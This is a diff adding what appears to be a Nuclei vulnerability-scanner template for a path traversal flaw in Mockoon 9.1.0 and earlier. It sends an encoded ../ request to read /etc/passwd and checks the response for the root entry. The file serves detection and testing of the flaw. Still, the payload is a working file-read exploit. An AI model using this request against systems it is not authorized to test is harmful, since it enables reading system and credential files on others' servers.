@@ -1,0 +1,34 @@
+id: mockoon-lfi
+
+info:
+  name: Mockoon <= 9.1.0 - Path Traversal
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: high
+  description: |
+    A mock API configuration for static file serving following the same approach presented in the documentation page, where the server filename is generated via templating features from user input is vulnerable to Path Traversal and LFI, allowing an attacker to get any file in the mock server filesystem.
+  reference:
+    - https://github.com/advisories/GHSA-w7f9-wqc4-3wxr
+  tags: mockoon,lfi,oos
+
+variables:
+  static_dir: "static"
+
+http:
+  - raw:
+      - |
+        GET /{{static_dir}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: content_type
+        words:
+          - "application/json"
+# digest: 4b0a00483046022100bb290a0cac2ff55d8fa2b99ae1b5acf63543cdcbe843b381c64bdeafb5418e99022100bce0053cb8739d4be1aefb1c33e6620625498a2ef26ccb1d30f55cd6424fd06c:922c64590222798bb761d5b6d8e72950
